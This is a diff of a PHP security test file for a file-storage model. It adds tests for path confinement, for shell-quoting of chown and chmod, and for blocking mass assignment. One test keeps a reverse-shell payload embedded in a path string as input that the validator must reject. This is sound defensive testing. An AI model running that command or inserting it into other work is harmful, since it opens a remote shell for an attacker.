@@ -1,5 +1,7 @@
 <?php
 
+use App\Models\LocalFileVolume;
+
 /**
  * File Storage Security Tests
  *
@@ -47,27 +49,6 @@ test('file storage rejects command injection with redirect operators', function 
 test('file storage rejects reverse shell payload', function () {
     expect(fn () => validateShellSafePath('/tmp$(bash -i >& /dev/tcp/10.0.0.1/8888 0>&1)', 'storage path'))
         ->toThrow(Exception::class);
-});
-
-test('file storage escapes paths properly', function () {
-    $path = "/var/www/app's data";
-    $escaped = escapeshellarg($path);
-
-    expect($escaped)->toBe("'/var/www/app'\\''s data'");
-});
-
-test('file storage escapes paths with spaces', function () {
-    $path = '/var/www/my app/data';
-    $escaped = escapeshellarg($path);
-
-    expect($escaped)->toBe("'/var/www/my app/data'");
-});
-
-test('file storage escapes paths with special characters', function () {
-    $path = '/var/www/app (production)/data';
-    $escaped = escapeshellarg($path);
-
-    expect($escaped)->toBe("'/var/www/app (production)/data'");
 });
 
 test('file storage accepts legitimate absolute paths', function () {
@@ -204,14 +185,25 @@ test('confined path resolver rejects paths that escape the resource configuratio
 test('local file volume write sink keeps saved managed file paths for compatibility', function () {
     $source = file_get_contents(__DIR__.'/../../app/Models/LocalFileVolume.php');
 
-    expect($source)->not->toContain('confinePathToBase($workdir, $path->value(), \'storage path\')')
+    expect($source)->toContain('confinePathToBase($workdir, $path->value(), \'storage path\')')
+        ->and($source)->toContain('assertRemotePathIsConfined')
         ->and($source)->toContain('tee {$escapedPath}');
 });
 
-test('host file mounts are bind-only and skipped by server storage writes', function () {
+test('file storage quotes owner and mode as single command arguments', function () {
     $source = file_get_contents(__DIR__.'/../../app/Models/LocalFileVolume.php');
 
-    expect($source)->toContain('if ($this->is_host_file) {')
-        ->and($source)->toContain('return;')
-        ->and($source)->toContain('tee {$escapedPath}');
+    expect($source)
+        ->toContain("'chown -- '.escapeshellarg(\$chown).\" {\$escapedPath}\"")
+        ->toContain("'chmod -- '.escapeshellarg(\$chmod).\" {\$escapedPath}\"")
+        ->not->toContain('"chown $chown {$escapedPath}"')
+        ->not->toContain('"chmod $chmod {$escapedPath}"');
+});
+
+test('file storage permissions cannot be set by mass assignment', function () {
+    $volume = new LocalFileVolume;
+    $volume->fill(['chown' => 'root', 'chmod' => '777']);
+
+    expect($volume->chown)->toBeNull()
+        ->and($volume->chmod)->toBeNull();
 });
